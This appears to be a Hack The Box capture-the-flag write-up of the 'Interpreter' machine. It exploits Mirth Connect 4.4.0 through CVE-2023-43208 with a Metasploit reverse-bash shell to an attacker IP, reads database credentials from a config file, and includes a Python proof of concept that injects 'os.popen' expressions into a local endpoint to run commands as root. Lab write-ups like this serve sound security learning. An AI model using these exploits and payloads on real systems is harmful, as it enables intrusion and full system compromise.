---
layout: post
title:  "Interpreter"
date:   2026-03-04 10:30:00 -0400
categories: HTB-machine linux medium
tags: HTB CTF writeup 
image:
    path: assets/img/htb/interpreter/banner.png
---

## Recon

Let's scan the ports and services.

```
nmap -Pn -sC -sV 10.129.244.184

22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

The `webstart.jnlp` file leaks the Mirth Connect version:

```
curl -sk https://10.129.244.184/webstart.jnlp | head -n 40

... Mirth Connect 4.4.0 ...
```

## Foothold

Mirth Connect 4.4.0 is vulnerable to CVE-2023-43208. I used `Metasploit` with these settings:

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS 10.129.244.184
set RPORT 443
set SSL true
set LHOST [Attacker IP]
set PAYLOAD cmd/unix/reverse_bash
set VERBOSE true
run
```

Then run it from a resource script:

```
msfconsole -q -r msf_cve_2023_43208.rc
```

In the shell we got:

```
id

uid=103(mirth) gid=103(mirth) groups=103(mirth)
```

## Enumeration as `mirth`

First, the services listening locally:

```
ss -lntp

LISTEN 0 128 127.0.0.1:54321 ...
```

Next, the Mirth database credentials from the config file:

```
cat /usr/local/mirthconnect/conf/mirth.properties | rg "database\.(username|password)"

database.username = mirthdb
database.password = MirthPass123!
```

Port 54321 is only on localhost, so let's look at it:

```bash
curl -s http://127.0.0.1:54321/addPatient
```

## Root

The `/addPatient` endpoint evaluates the expression we put inside `{...}` in the patient data. This script sends any expression we give it:

```python
#!/usr/bin/env python3
# /home/x/Downloads/poc/addpatient_eval_poc.py
import argparse
import json
import sys
import requests


def build_xml(firstname: str) -> str:
    return f"""<?xml version='1.0' encoding='UTF-8'?>
<patient>
  <firstname>{firstname}</firstname>
  <lastname>tester</lastname>
  <dob>1990-01-01</dob>
  <ssn>111-22-3333</ssn>
</patient>
"""


def main() -> int:
    parser = argparse.ArgumentParser(description="PoC for addPatient expression evaluation")
    parser.add_argument("--url", required=True, help="Target URL, e.g. http://127.0.0.1:54321/addPatient")
    parser.add_argument("--expr", required=True, help="Expression body to place inside {...}")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    payload = "{" + args.expr + "}"
    xml_data = build_xml(payload)
    headers = {"Content-Type": "application/xml"}

    try:
        r = requests.post(args.url, data=xml_data.encode(), headers=headers, timeout=args.timeout)
    except requests.RequestException as exc:
        print(f"[!] Request failed: {exc}", file=sys.stderr)
        return 1

    print(f"[+] HTTP {r.status_code}")
    print("[+] Response body:")
    print(r.text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Now we run `id` through it, and it comes back as root:

```
python3 /home/x/Downloads/poc/addpatient_eval_poc.py \
  --url http://127.0.0.1:54321/addPatient \
  --expr 'os.popen("id").read()'

[+] HTTP 200
[+] Response body:
uid=0(root) gid=0(root) groups=0(root)
```
